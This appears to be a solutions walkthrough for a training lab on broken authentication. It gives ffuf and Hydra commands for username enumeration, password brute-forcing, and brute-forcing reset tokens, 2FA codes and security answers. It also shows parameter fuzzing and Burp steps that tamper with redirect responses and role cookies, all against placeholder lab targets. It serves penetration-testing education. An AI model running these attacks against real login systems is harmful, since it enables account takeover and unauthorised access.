# Broken Authentication

---

## Question: Enumerate a valid user on the web application.

**Provide the username as the answer.**

### Method

Use **ffuf** to fuzz usernames and filter out invalid responses.

```bash
ffuf -u http://SERVER_IP:PORT/index.php \
-X POST \
-H 'Content-Type: application/x-www-form-urlencoded' \
-w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
-d 'username=FUZZ&password=Academy_student!' \
-fr 'Unknown user' \
-ac -mc 200 -t 100
```

---

## Question: What is the password of the user `admin`?

### Step 1: Create a password list that matches the policy

(uppercase, lowercase, digit, minimum length 10)

```bash
grep '[[:upper:]]' /usr/share/wordlists/rockyou.txt \
| grep '[[:lower:]]' \
| grep '[[:digit:]]' \
| grep -E '.{10}' \
> rockyou_policy.txt
```

```bash
wc -l rockyou_policy.txt
```

### Step 2: Brute-force using ffuf

```bash
ffuf -u http://SERVER_IP:PORT/index.php \
-X POST \
-H 'Content-Type: application/x-www-form-urlencoded' \
-w /usr/share/wordlists/rockyou_policy.txt \
-d 'username=admin&password=FUZZ' \
-ac -mc 200 -t 100 \
-fr 'Invalid username'
```

---

## Question: What is the password of the user `admin`? (Using Hydra)

```bash
hydra -l admin \
-P /usr/share/wordlists/rockyou_policy.txt \
SERVER_IP -s PORT \
http-post-form \
"/index.php:username=admin&password=^PASS^:Invalid username" \
-t 64 -f -V
```

---

## Question: Take over another user’s account to obtain the flag.

### Method: Token brute-force

```bash
seq -w 0 9999 > tokens.txt
```

```bash
ffuf -w tokens.txt \
-u http://SERVER_IP:PORT/reset_password.php?token=FUZZ \
-fr "The provided token is invalid"
```

---

## Question: Brute-force the admin user’s 2FA code to obtain the flag.

```bash
ffuf -u http://SERVER_IP:PORT/2fa.php \
-X POST \
-H 'Content-Type: application/x-www-form-urlencoded' \
-b 'PHPSESSID=SESSIONID' \
-d 'otp=FUZZ' \
-w /usr/share/seclists/Fuzzing/tokens.txt \
-ac -t 100 \
-fr "Invalid 2FA Code"
```

---

## Question: Which city is the admin user from?

**Reset the admin password to obtain the flag.**

### Step 1: Generate city wordlist

```bash
cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
```

### Step 2: Brute-force security question

```bash
ffuf -u http://SERVER_IP:PORT/security_question.php \
-X POST \
-w city_wordlist.txt \
-d 'security_response=FUZZ' \
-b 'PHPSESSID=SESSIONID' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-ac -fr 'Incorrect response'
```

---

## Question: Bypass authentication using HTTP response manipulation.

### Method (Burp Suite)

1. Visit `/admin.php`
2. Enable **Intercept → Response**
3. Change:

   ```
   HTTP/1.1 302 Found
   ```

   to:

   ```
   HTTP/1.1 200 OK
   ```
4. Forward response → **Flag displayed**

---

## Question: Apply what you learned to bypass authentication and obtain the flag.

### Method: Parameter tampering

1. Login normally
2. Observe redirect:

   ```
   /admin.php?user_id=183
   ```
3. Fuzz `user_id`

```bash
ffuf -u http://SERVER_IP:PORT/admin.php?user_id=FUZZ \
-w /usr/share/seclists/Fuzzing/3-digits-000-999.txt \
-mr "HTB" \
-ac -t 100
```

---

## Question: Obtain administrative access via cookie manipulation.

### Method

1. Decode cookie (Base64):

   ```
   user=htb-stdnt;role=user
   ```
2. Modify to:

   ```
   user=htb-stdnt;role=admin
   ```
3. Encode → Hex
4. Replace cookie value
5. Refresh → **Flag**

---

## Question: Enumerate valid usernames (alternative target)

```bash
ffuf -u http://SERVER_IP:PORT/login.php \
-X POST \
-w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
-d 'username=FUZZ&password=password' \
-b 'PHPSESSID=SESSIONID' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-mr 'Unknown username or password' \
-ac -t 100
```

---

## Question: Brute-force password for identified user

```bash
ffuf -u http://SERVER_IP:PORT/login.php \
-X POST \
-w /usr/share/wordlists/rockyou_policy.txt \
-d 'username=gladys&password=FUZZ' \
-b 'PHPSESSID=SESSIONID' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-fr 'Unknown username or password' \
-ac -t 100
```

---

## Question: Bypass authentication after login using response manipulation.

### Method
1.  ```bash
    ffuf -u http://SERVER_IP:PORT/FUZZ.php \
    -w /usr/share/seclists/Discovery/Web-Content/common.txt \
    -t 100 \
    -ac
    ```
1. Login and reach `/profile.php`
2. Intercept response
3. Change:

   ```
   302 Found
   ```

   to:

   ```
   200 OK
   ```
4. Set `Location: /profile.php`
5. Forward → **Flag**